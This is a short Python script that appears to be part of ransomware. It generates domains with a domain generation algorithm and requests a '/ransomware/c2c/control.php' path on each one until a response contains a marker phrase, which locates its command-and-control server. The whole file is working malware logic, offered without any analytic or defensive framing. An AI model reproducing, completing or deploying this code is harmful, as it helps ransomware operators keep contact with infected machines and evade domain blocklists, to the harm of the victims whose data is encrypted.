import generate_dga
import urllib2
domains = generate_dga.generate_dga()

def check_dga():
    for i in range(len(domains)):
        try:
            response = urllib2.urlopen("http://"+domains[i]+"/ransomware/c2c/control.php");
            if "The_great_war_is_coming" in response.read():
                return domains[i]
        except:
            continue


